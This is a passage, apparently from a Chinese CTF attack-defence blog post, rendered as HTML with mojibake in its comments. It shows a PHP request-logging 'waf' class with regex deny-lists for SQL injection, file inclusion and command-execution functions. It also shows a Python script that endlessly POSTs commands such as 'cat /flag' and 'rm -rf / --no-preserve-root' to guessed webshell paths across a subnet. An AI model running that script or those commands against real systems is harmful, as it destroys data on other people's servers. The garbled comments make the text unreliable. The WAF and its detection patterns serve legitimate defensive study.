invoke__">waf</span>();<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">waf</span></span>&#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_url</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_data</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$headers</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$raw</span>;<br><br><br><span class="hljs-comment">// è‡ªåŠ¨éƒ¨ç½²æ„é€ æ–¹æ³•</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment">//echo &quot;class waf construct execute..&lt;/br&gt;&quot;;   //debug code</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_access_log_probably</span>();  <span class="hljs-comment">//è®°å½•è®¿é—®çºªå½•    ç±»ä¼¼äºæ—¥å¿—</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_access_logs_detailed</span>();  <span class="hljs-comment">//çºªå½•è¯¦ç»†è®¿é—®è¯·æ±‚åŒ…  </span><br><span class="hljs-comment">//echo &quot;class waf construct execute..2&lt;/br&gt;&quot;;</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><span class="hljs-comment">//echo &quot;class waf construct execute..3&lt;/br&gt;&quot;;</span><br><span class="hljs-variable language_">$this</span>-&gt;request_url= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//è·å–urlæ¥è¿›è¡Œæ£€æµ‹</span><br><br><br><span class="hljs-variable language_">$this</span>-&gt;request_data = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//è·å–post</span><br><br><span class="hljs-variable language_">$this</span>-&gt;headers =<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//è·å–header  </span><br><br><span class="hljs-comment">//echo &quot;class waf construct execute half..&lt;/br&gt;&quot;;</span><br><br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$this</span>-&gt;request_url)))); <span class="hljs-comment">//å¯¹URLè¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜åˆ™æ‹¦æˆªå¹¶è®°å½•</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$this</span>-&gt;request_data)))); <span class="hljs-comment">//å¯¹POSTçš„å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•</span><br><span class="hljs-comment">//echo &quot;class waf construct execute..4&lt;/br&gt;&quot;;</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">detect_upload</span>();<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">gloabel_attack_detect</span>();<br><br><br><span class="hljs-comment">//echo &quot;class waf construct execute  success..&lt;/br&gt;&quot;;</span><br><br>&#125;<br><br><span class="hljs-comment">//å…¨å±€è¾“å…¥æ£€æµ‹  åŸºæœ¬çš„urlå’Œpostæ£€æµ‹è¿‡äº†åˆ™å¯¹æ‰€æœ‰è¾“å…¥è¿›è¡Œç®€å•è¿‡æ»¤</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gloabel_attack_detect</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//å¯¹httpè¯·æ±‚å¤´è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//ç®€å•è¿‡æ»¤</span><br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">//æ‹¦æˆªæ‰€æœ‰çš„æ–‡ä»¶ä¸Šä¼   å¹¶è®°å½•ä¸Šä¼ æ“ä½œ  å¹¶å°†ä¸Šä¼ æ–‡ä»¶ä¿å­˜è‡³ç³»ç»Ÿtmpæ–‡ä»¶å¤¹ä¸‹</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detect_upload</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]&gt;<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å°ä¼™å­ä½ ä¸è®²æ­¦å¾·å•Šï¼Œä½ è¿™ä¸Šä¼ çš„æ˜¯å•¥?????ä½ å¾ˆå±é™©å•Šï¼(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;Upload&quot;</span>);<br><span class="hljs-comment">//move_uploaded_file($_FILES[$key][&quot;tmp_name&quot;],&#x27;/tmp/uoloadfiles/&#x27;.$_FILES[$key][&quot;name&quot;]);</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//è®°å½•æ¯æ¬¡å¤§æ¦‚è®¿é—®è®°å½•ï¼Œç±»ä¼¼æ—¥å¿—ï¼Œä»¥ä¾¿åœ¨è¯¦ç»†è®°å½•ä¸­æŸ¥æ‰¾</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_access_log_probably</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$raw</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&#x27;    &#x27;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27;     &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27;     &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>].<span class="hljs-string">&#x27;    &#x27;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-string">&#x27;POST: &#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;all_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//æ—¥å¿—è·¯å¾„ </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$raw</span>);  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>&#125;<br><br><span class="hljs-comment">//è®°å½•è¯¦ç»†çš„è®¿é—®å¤´è®°å½•ï¼ŒåŒ…æ‹¬GET POST httpå¤´   ä»¥è·å–é€šé˜²wafæœªæ£€æµ‹åˆ°çš„æ”»å‡»payload</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_access_logs_detailed</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- &quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_http_raws</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;all_requests_detail.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//æ—¥å¿—è·¯å¾„ </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$data</span>));  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è·å–httpè¯·æ±‚å¤´å¹¶å†™å…¥æ•°ç»„</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(); <br> <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br>            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>; <br>        &#125; <br>    &#125; <br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>; <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ£€æµ‹ä¸å¯è§å­—ç¬¦é€ æˆçš„æˆªæ–­å’Œç»•è¿‡æ•ˆæœï¼Œæ³¨æ„ç½‘ç«™è¯·æ±‚å¸¦ä¸­æ–‡éœ€è¦ç®€å•ä¿®æ”¹</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ascii</span>&gt;<span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>)&#123; <span class="hljs-comment">//æœ‰ä¸­æ–‡è¿™é‡Œè¦ä¿®æ”¹</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>)))&#123;<br>                <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>), <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ£€æµ‹ç½‘ç«™ç¨‹åºå­˜åœ¨äºŒæ¬¡ç¼–ç ç»•è¿‡æ¼æ´é€ æˆçš„%25ç»•è¿‡ï¼Œæ­¤å¤„æ˜¯å¾ªç¯å°†%25æ›¿æ¢æˆ%ï¼Œç›´è‡³ä¸å­˜åœ¨%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br>&#125; <br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ”»å‡»å…³é”®å­—æ£€æµ‹ï¼Œæ­¤å¤„ç”±äºä¹‹å‰å°†ç‰¹æ®Šå­—ç¬¦æ›¿æ¢æˆç©ºæ ¼ï¼Œå³ä½¿å­˜åœ¨ç»•è¿‡ç‰¹æ€§ä¹Ÿç»•ä¸è¿‡æ­£åˆ™çš„\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|and\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//æ–‡ä»¶åŒ…å«çš„æ£€æµ‹</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>))&#123; <br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(|file_put_contents|fwrite|curl|system|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restorei/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ç®€å•å°†æ˜“å‡ºç°é—®é¢˜çš„å­—ç¬¦æ›¿æ¢æˆä¸­æ–‡</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;â€˜&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;â€œ&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;ã€Š&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;ã€‹&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è·å–httpçš„è¯·æ±‚åŒ…ï¼Œæ„ä¹‰åœ¨äºè·å–åˆ«äººçš„æ”»å‡»payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raws</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>; <br>     <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>); <br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>); <br>            <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\r\n&quot;</span>; <br>        &#125; <br>    &#125; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>; <br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¿™é‡Œæ‹¦æˆªå¹¶è®°å½•æ”»å‡»payload      ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè®°å½•ç±»å‹   ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ—¥å¿—å†…å®¹   ä½¿ç”¨æ—¶ç›´æ¥è°ƒç”¨å‡½æ•°</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- [&quot;</span>.<span class="hljs-variable">$alert</span>.<span class="hljs-string">&quot;]&quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_http_raws</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;attack_detected_log.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//æ—¥å¿—è·¯å¾„ </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;f1989134-db6e-4769-ac1b-9d6ebf9ef46d&#125;&quot;</span>; <span class="hljs-comment">//å¦‚æœè¯·æ±‚å¸¦æœ‰flagå…³é”®å­—ï¼Œæ˜¾ç¤ºå‡çš„flagã€‚ï¼ˆ2333333ï¼‰</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">//æ‹¦æˆªå‰å»¶æ—¶3ç§’</span><br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><br>&#125;<br><span class="hljs-variable">$waf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">waf</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">åwaf<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_attack</span>():<br>    file=&#123;<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;admin.php&#x27;</span>,<span class="hljs-string">&#x27;web.php&#x27;</span>,<span class="hljs-string">&#x27;login.php&#x27;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>,<span class="hljs-string">&#x27;footer.php&#x27;</span>,<span class="hljs-string">&#x27;.a.php&#x27;</span>&#125;<br>    payload=&#123;<span class="hljs-string">&#x27;getflag&#x27;</span>,<span class="hljs-string">&#x27;cat /flag&#x27;</span>,<span class="hljs-string">&#x27;ls -al&#x27;</span>,<span class="hljs-string">&#x27;rm -f&#x27;</span>,<span class="hljs-string">&#x27;echo 1&#x27;</span>,<span class="hljs-string">&#x27;echo 1 /proc/sys/net/ipv4/ip_forward&#x27;</span>,<span class="hljs-string">&#x27;rm -rf / --no-preserve-root&#x27;</span>&#125;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">52</span>):<br>            <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> file:<br>                url=<span class="hljs-string">&#x27;http://192.168.63.&#x27;</span>+ <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;:8801/&#x27;</span>+ii<br>                <span class="hljs-built_in">print</span>(url)<br>                <span class="hljs-keyword">for</span> iii <span class="hljs-keyword">in</span> payload:<br>                    data=&#123;<br>                        <span class="hljs-string">&#x27;payload&#x27;</span>:iii<br>                    &#125;<br>                    <span class="hljs-keyword">try</span>:<br>                        requests.post(url,data=data)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£åœ¨æ…å±:&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;|&#x27;</span>+ii+<span class="hljs-string">&#x27;|&#x27;</span>+iii)<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_attack()<br><br></code></pre></td></tr></table></figure><p>3.åé—¨æ‰«æï¼šdç›¾ï¼Œseay</p><p>4.ä¸æ­»é©¬å’Œåä¸æ­»é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 